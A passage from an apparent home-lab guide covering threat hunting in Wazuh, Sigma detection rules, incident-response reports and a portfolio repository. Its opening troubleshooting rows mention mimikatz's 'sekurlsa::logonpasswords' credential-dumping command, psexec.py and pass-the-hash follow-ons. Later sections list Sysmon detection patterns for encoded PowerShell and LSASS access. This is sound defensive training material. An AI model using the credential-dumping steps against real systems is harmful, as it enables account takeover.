| `sekurlsa::logonpasswords` returns no passwords, only NTLM hashes | Expected on modern Windows with credential guard / WDigest disabled by default — this is realistic behavior, not a failure. NTLM hashes are still enough for pass-the-hash style follow-on techniques if you want to extend the lab |
| psexec.py fails with "STATUS_ACCESS_DENIED" | Account used doesn't have local admin rights on the target — use ITAdmin (Domain Admin) rather than a standard user account |
| Nothing shows up in Wazuh for any of these | Go back and confirm the Sysmon `<localfile>` block from Phase 6 is still present and the agent service was restarted after adding it |

---

## Phase 9 – Threat Hunting

For each attack in Phase 8, go into Wazuh and manually search/build a query for the corresponding raw signal *before* writing a formal rule — this is what makes Phase 10 meaningful rather than copy-pasted rules.

- Encoded PowerShell → search Sysmon EID 1 where `CommandLine` contains `-enc` or `-EncodedCommand`.
- LSASS access → Sysmon EID 10 where `TargetImage` contains `lsass.exe`.
- Scheduled tasks → Sysmon EID 1 for `schtasks.exe`/`taskeng.exe`, plus Windows Security EID 4698.
- Registry changes → Sysmon EID 13 (RegistryEvent), especially Run keys under `HKLM\...\CurrentVersion\Run`.
- Failed logins → Windows Security EID 4625; look for bursts against multiple accounts (spray signature) vs. repeated attempts on one account (brute force signature).
- Suspicious processes → Sysmon EID 1 with unusual parent/child relationships (e.g., `winword.exe` spawning `powershell.exe`), or processes launched from unusual paths (`\Users\...\AppData\Local\Temp\`).

Document, for each, the exact Wazuh query/filter you used — you'll reuse this almost verbatim as the "detection logic" section in Phase 10 and Phase 11.

---

## Phase 10 – Detection Engineering

1. Write one Sigma rule per attack scenario, based directly on the field/values you identified while hunting in Phase 9 — don't guess at field names, pull them from the actual Wazuh event JSON (expand an event in Discover to see raw fields).
2. Sigma rules target the log source's field taxonomy (Sysmon field names, in this case) — validate structure with the `sigma-cli`/`pySigma` tool (`pip install sigma-cli`) using `sigma check` before converting.
3. Convert to Wazuh-native rules: Wazuh doesn't consume Sigma directly in older versions — you'll either hand-translate the Sigma logic into a custom Wazuh XML rule (`/var/ossec/etc/rules/local_rules.xml`) or use a Sigma-to-Wazuh converter, depending on your Wazuh version's Sigma support. Check current Wazuh docs for the supported method at your installed version.
4. After adding each custom rule, restart the manager (`sudo systemctl restart wazuh-manager`), re-run the corresponding attack from Phase 8, and confirm the new rule fires (check Discover for your custom rule ID/description) — this closes the loop from "I can find this manually" to "the SIEM tells me automatically."

---

## Phase 11 – Incident Response Documentation

For **each** attack scenario, produce a short report containing:
- Executive summary (2-3 sentences, non-technical)
- Timeline (timestamped, pulled straight from Wazuh event timestamps)
- MITRE ATT&CK technique ID and tactic (e.g., T1003.001 — Credential Access)
- IOCs (process names, command lines, file hashes if applicable, source/destination IPs)
- Detection (which Wazuh/Sigma rule fired, or would need to)
- Containment/eradication steps you'd take in a real environment
- Recovery steps
- Lessons learned / recommended hardening

Keep a consistent template across all scenarios — this consistency is what reads as "professional" to anyone reviewing your portfolio.

---

## Phase 12 – GitHub Portfolio

1. Structure the repo clearly, e.g.:
```
/architecture/       - network diagram, AD structure diagram
/screenshots/         - Wazuh dashboard views, ADUC, attack execution proof
/detections/          - Sigma rules + Wazuh XML rules
/incident-reports/    - one markdown file per Phase 8 scenario, using the Phase 11 template
/mitre-mapping/        - a single table mapping every technique tested to detection status
README.md
```
2. **Redact before publishing:** strip real usernames/passwords used in testing (even lab ones — habit-forming for real engagements), internal IPs are fine to leave since it's a private range, but scrub any host-specific identifiers you wouldn't want public if you ever reuse this repo as a live reference.
3. A single MITRE ATT&CK Navigator-style heatmap image showing covered techniques is a strong portfolio centerpiece — MITRE provides a free web-based Navigator tool for generating this from a technique list.
